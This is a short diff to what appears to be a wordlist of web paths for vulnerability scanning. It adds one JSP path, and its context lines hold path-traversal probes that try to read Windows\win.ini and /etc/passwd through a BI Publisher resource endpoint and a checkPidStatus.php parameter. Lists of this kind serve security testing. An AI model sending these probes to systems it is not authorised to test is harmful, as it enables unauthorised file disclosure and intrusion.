@@ -1,5 +1,6 @@
 /REST/v1/swagger
 /xmlpserver/servlet/adfresource?format=aaaaaaaaaaaaaaa&documentId=..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\Windows\win.ini
+/workspace/index.jsp
 /atlantis/login.php
 /API/process/checkPidStatus.php?pid=/../etc/passwd
 /API/process/checkPidStatus.php?pid=/../../etc/passwd
